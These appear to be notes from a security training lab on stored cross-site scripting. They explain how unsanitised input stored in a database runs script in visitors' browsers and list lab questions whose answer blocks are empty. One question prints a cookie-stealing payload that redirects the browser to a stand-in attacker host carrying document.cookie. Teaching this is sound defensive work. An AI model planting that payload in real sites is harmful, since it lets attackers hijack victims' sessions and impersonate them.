# Stored XSS

- Stored cross-site scripting is the most dangerous type of XSS. This is where a malicious string originates from the website's database. This often happens when a website allows user input that is ***not sanitised*** (remove the **"bad parts"** of a user's input) when inserted into the database.
   
  ![Screenshot (820)](https://user-images.githubusercontent.com/63872951/183843240-6955d1d5-1a23-42e6-8be3-67dbf8544db7.png)
 
- A attacker creates a payload in a field when signing up to a website that is stored in the websites database. 
- If the website doesn't properly sanitise that field, when the site displays that field on the page, it will execute the payload **to everyone** who visits it. 
- The payload could be as simple as `<script>alert(1)</script>`
- However, this payload won't just execute in your browser but any other browsers that display the malicious data inserted into the database.


# Answer the questions below

- The machine you deployed earlier will guide you though exploiting some cool vulnerabilities, stored XSS has to offer. There are hints for answering these questions on the machine.

1. Add a comment and see if you can insert some of your own HTML.

Doing so will reveal the answer to this question.
```

```
2. Create an alert popup box appear on the page with your document cookies.
```

```
3. Change "XSS Playground" to "I am a hacker" by adding comments and using Javascript.
```

```
4. Stored XSS can be used to steal a victims cookie (data on a machine that authenticates a user to a webserver). This can be done by having a victims browser parse the following Javascript code:

   `<script>window.location='http://attacker/?cookie='+document.cookie</script>`

   This script navigates the users browser to a different URL, this new request will includes a victims cookie as a query parameter. When the attacker has acquired the cookie, they can use it to impersonate the victim. 

   Take over Jack's account by stealing his cookie, what was his cookie value?
```

```
5. Post a comment as Jack.
```

```
